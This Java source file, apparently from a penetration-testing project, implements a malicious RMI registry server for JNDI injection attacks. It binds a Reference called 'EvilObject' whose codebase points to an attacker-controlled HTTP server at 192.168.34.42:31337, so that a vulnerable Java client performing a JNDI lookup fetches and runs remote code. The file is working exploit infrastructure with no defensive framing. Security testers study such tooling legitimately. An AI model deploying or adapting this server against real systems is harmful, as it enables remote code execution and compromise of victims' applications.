package de.marko.pentest;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author marko
 * @version 1.0.0.
 * @date 21.08.2017
 */
public class JNDIServer {

	private final static Logger LOGGER = LoggerFactory.getLogger(JNDIServer.class);

	private static Registry registry;

	private static final String ref = "EvilObject";

	private static final String serverIP = "192.168.34.42";

	private static final int serverPort = 1099;

	public static void main(String[] args) throws RemoteException {

		try {
			LOGGER.info("Creating RMI Registry");

			System.setProperty("java.rmi.server.hostname", serverIP);

			registry = LocateRegistry.createRegistry(serverPort);

			Reference reference = new Reference(ref, ref, "http://" + serverIP + ":31337/");

			ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

			LOGGER.info("Binding 'refObjWrapper' to rmi://"+ serverIP + ": "+ serverPort + " /" + ref);

			registry.bind(ref, referenceWrapper);

		} catch (IOException e) {
			LOGGER.error("Cannot create server interface.", e);
		} catch (AlreadyBoundException e) {
			LOGGER.error("Cannot create server interface. Port already bound", e);
		} catch (Exception e) {
			LOGGER.error("Cannot load EvilObject.", e);
		}
	}

}
